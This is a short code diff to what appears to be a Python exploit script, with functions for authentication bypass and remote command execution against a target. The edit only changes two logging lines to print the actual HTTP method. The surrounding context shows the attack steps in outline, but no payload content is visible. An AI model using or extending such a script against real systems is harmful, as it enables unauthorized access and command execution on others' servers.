@@ -188,7 +188,7 @@ def auth_bypass(session, target):
 
     r = session.post(url, data=data, allow_redirects=False)
 
-    log.info(f"[step 1] POST {url} -> {YELLOW}{r.status_code}{NC}")
+    log.info(f"[step 1] {r.request.method} {url} -> {YELLOW}{r.status_code}{NC}")
     log.debug(f"[step 1] Response:\n {r.text[:200]}")
 
     if r.status_code in (200, 301, 302) or "home" in r.text.lower(): # The string 'home' is a placeholder, change it
@@ -210,7 +210,7 @@ def rce(session, cookies, target, cmd):
     r = session.get(f"{url}", params={"id": payload}, cookies=cookies)
     out = r.text
 
-    log.info(f"[step 2] GET {url} -> {YELLOW}{r.status_code}{NC}")
+    log.info(f"[step 2] {r.request.method} {url} -> {YELLOW}{r.status_code}{NC}")
     log.debug(f"[step 2] Response:\n {r.text[:200]}")
 
     if r.status_code in (400, 404, 500) or "error" in r.text.lower(): # The string 'home' is a placeholder, change it
